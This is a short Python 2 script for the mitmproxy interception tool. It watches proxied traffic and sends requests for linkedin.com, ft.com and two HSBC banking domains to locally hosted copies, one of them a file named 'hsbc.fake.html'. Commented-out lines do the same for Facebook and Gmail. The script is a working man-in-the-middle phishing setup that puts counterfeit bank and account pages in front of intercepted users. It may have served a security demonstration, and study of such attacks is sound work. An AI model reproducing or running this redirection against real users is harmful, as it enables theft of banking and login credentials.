from libmproxy.protocol.http import HTTPResponse
from netlib.odict import ODictCaseless

"""
This example shows two ways to redirect flows to other destinations.
"""


def request(context, flow):
    # pretty_host(hostheader=True) takes the Host: header of the request into account,
    # which is useful in transparent mode where we usually only have the IP otherwise.

    # Method 2: Redirect the request to a different server
    flower = flow.request.pretty_host(hostheader=True)
    print "Requested domain: {}".format( flower )
    #if flower.endswith("facebook.com"):
	#print dir(flow.request)
        #flow.request.host = "localhost"
	#flow.request.port = 8000
        #flow.request.path = "local/facebook.html"
	#flow.request.update_host_header()
    #if flower.endswith("gmail.com"):
	#print dir(flow.request)
        #flow.request.host = "localhost"
	#flow.request.port = 8000
        #flow.request.path = "local/gmail.html"
	#flow.request.update_host_header()
    if flower.endswith("linkedin.com"):
	#print dir(flow.request)
        flow.request.host = "localhost"
	flow.request.port = 8000
        flow.request.path = "local/linkedin.html"
	flow.request.update_host_header()
    if flower.endswith("ft.com"):
	#print dir(flow.request)
        flow.request.host = "localhost"
	flow.request.port = 8000
        flow.request.path = "local/financialTimes.htm"
	flow.request.update_host_header()
    if flower.endswith("hsbclogin.com"):
	#print dir(flow.request)
        flow.request.host = "localhost"
	flow.request.port = 8000
        flow.request.path = "local/hsbclogin.html"
	flow.request.update_host_header()
    if flower.endswith("hsbc.co.uk"):
        print dir(flow.request)
        flow.request.host = "localhost"
        flow.request.port = 8000
        #flow.request.path = "local/hsbc.co.uk.html"
	#flow.request.path = "local/hsbc-minified.html"
        flow.request.path = "local/hsbc.fake.html"
	flow.request.update_host_header()

